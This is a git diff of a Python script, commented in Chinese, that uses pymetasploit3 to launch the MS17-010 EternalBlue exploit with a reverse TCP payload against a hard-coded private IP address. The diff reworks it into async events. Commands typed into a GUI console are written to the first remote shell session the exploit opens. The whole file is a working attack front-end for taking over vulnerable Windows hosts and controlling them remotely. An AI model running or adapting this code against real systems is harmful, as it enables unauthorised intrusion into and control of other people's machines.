@@ -1,3 +1,4 @@
+import asyncio
 import sys
 import threading
 
@@ -5,44 +6,40 @@ import pymetasploit3.msfrpc
 from pymetasploit3.msfrpc import MsfRpcClient
 
 from libs.Attack import Attack
-from libs.GUI_Template import GUI_Template
+from libs.GUI import GUI
 from libs.Logger import Logger
 from libs.Modules import Modules
 from libs.Payloads import Payloads
 
-logger = Logger('Main')
 client: MsfRpcClient
+logger = Logger('Main')
+gui = GUI('My Console')
 
 
-class GUI(GUI_Template):
-    """
-    繼承模板
-    """
+@gui.event
+async def on_input_line(self, text):
+    # 若無 client 定義、連線
+    if not client:
+        self.println('請等待 RPC 連線成功再輸入指令')
+        return
 
-    def input_event(self, text):
-        if not client:
-            self.println('請等待 RPC 連線成功再輸入指令')
-            return
+    # 若無 Session
+    if len(client.sessions.list) == 0:
+        self.println('目前無可用的 session 連線')
+        return
 
-        if len(client.sessions.list) == 0:
-            self.println('目前無可用的 session 連線')
-            return
+    # 顯示輸入內容
+    self.println(f'$ {text}')
 
-        self.println(f'$ {text}')
-        shell = client.sessions.session(list(client.sessions.list.keys())[0])
-        self.println(shell.run_with_output(text))
-
-    def global_key_event(self, event):
-        ...
-        # print(f'按鍵: {event}')
+    # 傳送指令
+    shell = client.sessions.session(list(client.sessions.list.keys())[0])
+    shell.write(text)
 
 
-def attack_thread(gui):
+def attack_thread():
     """
     異步攻擊線程
 
-    :param  gui:
-    :type   gui: (GUI)
     """
 
     # 建立客戶端
@@ -56,25 +53,38 @@ def attack_thread(gui):
         sys.exit(1)
 
     # 建立攻擊
-    atk = Attack(client, '172.20.10.2', Modules.MS17_010_ETERNALBLUE, Payloads.REVERSE_TCP)
+    atk = Attack(client,
+                 Modules.MS17_010_ETERNALBLUE,
+                 Payloads.REVERSE_TCP,
+                 ('RHOSTS', '192.168.2.116'),
+                 )
 
-    logger.info('正在開始攻擊...')
+    @atk.event
+    async def on_read(text):
+        gui.println(text)
+
     # 開始攻擊
+    logger.info('正在開始攻擊...')
     gui.print(atk.run())
 
 
-if __name__ == "__main__":
-    # 初始化介面
-    gui = GUI('My Console')
-
+async def main():
     # 異步線程執行攻擊
-    t1 = threading.Thread(target=attack_thread, args=(gui,))
+    t1 = threading.Thread(target=attack_thread)
     t1.start()
 
     # 建立介面
-    gui.build()
+    await gui.build()
 
     # 等待攻擊線程完成
     logger.info('正在關閉...')
-    t1.join()
-    logger.info('關閉完成')
+
+    for i in list(client.sessions.list.keys()):
+        client.sessions.session(i).stop()
+
+    t1.join(timeout=60)
+    logger.succ('關閉完成')
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
